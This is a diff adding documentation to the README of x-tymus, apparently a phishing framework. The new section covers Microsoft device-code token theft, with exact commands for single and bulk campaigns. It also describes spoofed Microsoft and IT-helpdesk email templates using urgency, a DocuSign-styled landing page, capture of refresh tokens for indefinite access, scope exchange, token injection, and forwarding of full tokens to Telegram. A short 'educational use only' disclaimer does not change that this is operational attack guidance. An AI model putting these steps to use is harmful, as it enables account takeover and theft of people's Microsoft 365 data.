@@ -26,6 +26,7 @@
 - [Quick Start](#quick-start)
 - [Command Reference](#command-reference)
 - [Configuration Reference](#configuration-reference)
+- [Device Code Flow](#device-code-flow)
 - [StealthAI](#stealthai)
 - [GoPhish Integration](#gophish-integration)
 - [Proxy System](#proxy-system)
@@ -114,6 +115,17 @@
 - Credential submission reporting
 - Proxy-aware API calls
 - Connection test command
+
+### Device Code Flow (OAuth2)
+- Microsoft device code authentication flow
+- Single target or bulk campaign targeting
+- Automated email delivery via SMTP
+- Access token, refresh token, and ID token capture
+- Refresh token exchange for custom scopes (Graph, Teams, etc.)
+- Landing page with user code display
+- Built-in email templates (security alert, IT helpdesk)
+- Telegram notifications on token capture
+- Persistent state with automatic resumption on restart
 
 ### Playwright Browser Automation
 - Headless Chrome automation
@@ -243,6 +255,12 @@ lures get-url 0
 | `config turnstile_privkey <key>` | Cloudflare Turnstile private key |
 | `config recaptcha_sitekey <key>` | Google reCAPTCHA site key |
 | `config recaptcha_privkey <key>` | Google reCAPTCHA private key |
+| `config smtp_host <host>` | SMTP server hostname |
+| `config smtp_port <port>` | SMTP port (default 587) |
+| `config smtp_user <user>` | SMTP username |
+| `config smtp_pass <pass>` | SMTP password |
+| `config smtp_from <email>` | Sender email address |
+| `config dc_landing_host <host>` | Device code landing page hostname |
 
 ### Phishlets
 
@@ -325,6 +343,19 @@ lures get-url 0
 | `config gophish insecure <true\|false>` | Skip TLS verify |
 | `config gophish test` | Test connection |
 
+### Device Code
+
+| Command | Description |
+|---|---|
+| `dc start <email\|tenant>` | Start single device code flow |
+| `dc campaigns` | List all campaigns |
+| `dc campaigns <id>` | Show campaign details |
+| `dc targets` | List all targets (all campaigns) |
+| `dc targets <id>` | Show target details |
+| `dc launch <name> <template> <file>` | Launch bulk campaign (emails from file) |
+| `dc refresh <id> <scope>` | Refresh token for different scope |
+| `dc inject <id>` | Generate token injection script |
+
 ---
 
 ## Configuration Reference
@@ -361,8 +392,204 @@ Default config: `~/.x-tymus/config.json`
   "turnstile_sitekey": "",
   "turnstile_privkey": "",
   "recaptcha_sitekey": "",
-  "recaptcha_privkey": ""
+  "recaptcha_privkey": "",
+  "smtp": {
+    "host": "smtp.office365.com",
+    "port": 587,
+    "user": "noreply@company.com",
+    "pass": "",
+    "from": "IT Support <noreply@company.com>"
+  },
+  "dc_landing_host": "phish.attacker.com"
 }
+```
+
+---
+
+## Device Code Flow
+
+⚠️ **IMPORTANT: Educational Use Only**
+This documentation covers Device Code Flow attacks for authorized red-team exercises, penetration testing, and defensive security research only. Unauthorized access to computer systems is illegal. Only use this feature within:
+- Controlled lab environments
+- Authorized penetration tests with written approval
+- Your own test accounts
+- Educational settings with explicit consent
+
+Device Code Flow is an OAuth2 authentication method that allows users to authenticate on a secondary device. This is exploited by x-tymus to capture access tokens, refresh tokens, and identity information from Office 365 / Microsoft accounts.
+
+**Defensive perspective:** Organizations should educate users about device code phishing, implement multi-factor authentication, monitor for unusual OAuth token activity, and use conditional access policies.
+
+**How it works:**
+
+1. Attacker initiates a device code request to Microsoft's OAuth endpoint
+2. Microsoft returns a user code and verification URI
+3. Attacker sends phishing email with the user code
+4. Victim navigates to `microsoft.com/devicelogin` and enters the code
+5. Victim signs in with their Office 365 credentials
+6. Microsoft issues tokens back to the attacker's session
+7. x-tymus captures and logs all tokens (access, refresh, ID)
+8. Attacker can use refresh tokens to access victim's resources indefinitely
+
+### Single Target
+
+Start a device code flow for one user:
+
+```
+dc start user@company.com
+dc targets
+dc targets 1
+```
+
+The target receives no email (manual delivery required). The device code remains valid for 15 minutes while x-tymus polls for token capture.
+
+### Bulk Campaign
+
+Launch a campaign targeting multiple users with automated SMTP email delivery:
+
+```
+config smtp_host smtp.office365.com
+config smtp_port 587
+config smtp_user phishing-account@attacker.com
+config smtp_pass PASSWORD
+config smtp_from "IT Support <support@attacker.com>"
+config dc_landing_host phish.attacker.com
+
+dc launch "Q4 Security Audit" security_alert emails.txt
+```
+
+**emails.txt format (one per line):**
+```
+user1@company.com
+user2@company.com
+user3@company.com
+```
+
+The campaign automatically:
+- Initiates device code flows for each email
+- Generates unique verification URIs and user codes
+- Sends phishing emails via SMTP
+- Polls for token capture
+- Logs tokens upon completion
+- Notifies via Telegram (if configured)
+
+### Email Templates
+
+Two built-in templates:
+
+**`security_alert`** (default)
+- Subject: "Microsoft Security Alert: Sign-in Verification Required — [random 6 digits]"
+- Mimics Microsoft account security notice
+- Displays user code in a highlighted box
+- Includes "Complete Verification" button
+- Responsive HTML for mobile/desktop
+
+**`it_helpdesk`**
+- Subject: "Action Required: Verify Your Identity — [Domain]"
+- Frames verification as IT-initiated identity check
+- Displays user code prominently
+- Includes urgency ("within 15 minutes")
+- Microsoft branding and professional styling
+
+Custom templates can be loaded from disk:
+- Create `letter.html` in working directory for custom email body
+- Create `subject.txt` in working directory for custom subject line
+- Templates support personalization tokens (see below)
+
+### Personalization Tokens
+
+Email templates and landing pages support dynamic token replacement:
+
+| Token | Example | Notes |
+|---|---|---|
+| `USER` | `john` | Username part of email |
+| `DOMAIN` | `company.com` | Email domain |
+| `DOMs` | `company` | First label of domain (before dot) |
+| `DOMC` | `Company` | Capitalized domain label |
+| `SILENTCODERSEMAIL` | `john@company.com` | Full email address |
+| `SILENTCODERSEMAILURL` | `john%40company.com` | URL-encoded email (safe for URLs) |
+| `EMAILURLSILENTC0DERS` | `am9obkBjb21wYW55...` | Base64-encoded email |
+| `DCCODE` | `ABCD-1234` | Device code (auto-inserted) |
+| `DCLINK` | `https://...` | Microsoft deviceauth URL (auto-inserted) |
+| `DCLANDING` | `https://phish.../dc/token` | Attacker landing page URL (auto-inserted) |
+| `SILENTCODERSNUMBER` | `847291` | Random 6-digit number |
+| `SILENTCODERSLIMAHURUF` | `xkqmj` | Random 5-letter string |
+| `SILENTCODERSBANYAKHURUF` | `[50 random letters]` | Random 50-letter string |
+
+Example subject line:
+```
+Security Alert for USER@DOMAIN — Action Required
+```
+Becomes:
+```
+Security Alert for john@company.com — Action Required
+```
+
+### Token Capture & Refresh
+
+Upon successful authentication, x-tymus captures:
+
+- **access_token** — Short-lived (1h) token for immediate API access
+- **refresh_token** — Long-lived token that refreshes access tokens indefinitely
+- **id_token** — JWT containing identity claims (email, name, tenant ID)
+- **device_code** — Internal tracking identifier
+- **user_code** — Code victim entered
+
+Refresh tokens can be exchanged for tokens with different scopes:
+
+```
+dc refresh 1 "https://graph.microsoft.com/.default"
+```
+
+Returns a new access token for Microsoft Graph API calls.
+
+### Landing Page
+
+Served at `https://<dc_landing_host>/dc/<token>`
+
+The landing page:
+- Displays the user code prominently (large, selectable text)
+- Includes "Verify Now" button linking to `microsoft.com/devicelogin`
+- Auto-copies code to clipboard and redirects after 3 seconds
+- Styled to resemble DocuSign document review notification
+- Tracks impressions (landing page served = victim received email)
+
+### State Persistence
+
+Device code state is automatically saved to `dc_state.json`:
+
+```json
+[
+  {
+    "id": 1,
+    "campaign_id": 0,
+    "email": "user@company.com",
+    "tenant": "company.com",
+    "landing_token": "a1b2c3d4e5f6...",
+    "user_code": "ABCD-1234",
+    "status": "completed",
+    "access_token": "eyJ0eXAi...",
+    "refresh_token": "0.ARwAr...",
+    "id_token": "eyJ0eXAi...",
+    "started_at": "2025-01-15T14:22:00Z",
+    "expires_in": 900
+  }
+]
+```
+
+On restart, x-tymus automatically resumes polling for pending targets that haven't expired.
+
+### Notifications
+
+**Telegram alerts** (optional):
+
+When a token is captured, x-tymus sends:
+1. Target email + user code
+2. Access token (full)
+3. Refresh token (full)
+
+Enable with:
+```
+config webhook_telegram BOT_TOKEN CHAT_ID
 ```
 
 ---
